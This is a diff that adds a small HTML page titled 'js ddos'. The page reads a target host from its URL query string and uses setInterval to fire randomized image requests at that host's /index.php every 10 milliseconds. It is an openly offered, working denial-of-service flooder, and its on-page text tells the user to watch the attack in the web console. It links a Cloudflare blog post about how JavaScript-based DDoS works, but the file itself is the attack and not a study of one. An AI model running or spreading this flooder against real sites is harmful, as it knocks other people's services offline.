@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>js ddos</title>
+
+	<script type="text/javascript">
+
+		function getUrlVars() {
+		    var vars = {};
+		    var parts = window.location.href.replace(/[?&]+([^=&]+)=([^&]*)/gi, function(m,key,value) {
+		        vars[key] = value;
+		    });
+		    return vars;
+		}
+
+
+		var url = getUrlVars()["url"];
+
+		alert("Target URL = " + url);
+
+		
+		function imgflood() {  
+		  var TARGET = url
+		  var URI = '/index.php?'
+		  var pic = new Image()
+		  var rand = Math.floor(Math.random() * 1000)
+		  pic.src = 'http://'+TARGET+URI+rand+'=val'
+		}
+		setInterval(imgflood, 10)
+		
+	</script>
+
+</head>
+<body>
+
+<h1>ddos-ing. Open the web console to keep track of it.</h1>
+
+<h2>How JS Based DDoS works : <a href="https://blog.cloudflare.com/an-introduction-to-javascript-based-ddos/">Cloudflare Blog</a></h2>
+
+</body>
+</html>
